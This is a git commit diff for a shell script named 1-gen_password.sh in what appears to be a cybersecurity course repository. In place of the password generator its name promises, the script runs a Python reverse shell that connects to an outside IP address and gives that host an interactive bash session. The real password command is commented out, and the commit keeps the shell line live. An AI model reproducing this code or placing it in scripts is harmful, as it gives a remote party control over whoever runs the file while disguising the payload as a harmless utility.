40be3805fb6fb080bcc65e66312da57bb373a4c5
Yosri <YosriG1997@gmail.Com>
2024-01-11 06:14:15 +0100

    Update 1-gen_password.sh

--- cybersecurity_basics/0x00_introduction_cybersecurity/1-gen_password.sh
+++ cybersecurity_basics/0x00_introduction_cybersecurity/1-gen_password.sh
@@ -1,3 +1,2 @@
 #!/bin/bash
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("31.169.66.221",45231));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
-#tr -dc '[:alnum:]' < /dev/urandom | fold -w $1 | head -n 1
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("31.169.66.221",45231));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' #tr -dc '[:alnum:]' < /dev/urandom | fold -w $1 | head -n 1
